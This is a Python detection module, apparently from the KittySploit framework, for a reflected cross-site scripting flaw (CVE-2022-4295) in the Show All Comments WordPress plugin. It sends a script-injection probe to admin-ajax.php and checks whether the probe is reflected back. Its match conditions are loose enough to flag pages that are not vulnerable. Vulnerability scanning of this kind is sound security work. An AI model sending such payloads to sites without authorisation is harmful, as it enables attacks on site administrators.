#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Show All Comments WordPress plugin before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Show all comments < 7.0.1 - Cross-Site Scripting Detection',
        'description': 'The Show All Comments WordPress plugin before 7.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against a logged in high privilege users such as admin.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'wpscan',
            'wp',
            'wordpress',
            'wp-plugin',
            'xss',
            'show-all-comments-in-one-page',
            'appjetty',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/4ced1a4d-0c1f-42ad-8473-241c68b92b56',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4295',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-4295',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=sac_post_type_call&post_type=</option><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html', '<script>alert(document.domain)</script>', 'Select </option>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Show all comments < 7.0.1 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=sac_post_type_call&post_type=</option><script>alert(document.domain)</script>',
            )
            return True
        return False

